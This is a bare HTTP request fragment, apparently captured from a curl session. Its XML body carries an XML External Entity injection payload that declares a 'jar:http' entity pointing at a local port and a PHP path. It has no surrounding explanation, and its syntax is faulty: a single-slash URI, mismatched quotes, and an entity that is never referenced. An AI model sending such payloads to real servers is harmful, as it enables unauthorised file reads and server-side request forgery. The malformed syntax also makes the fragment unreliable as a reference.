User-Agent: curl/7.83.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE convert [ 
  <!ENTITY remote SYSTEM "jar:http:/localhost:9999/jarzip!/test.php'> 
]>
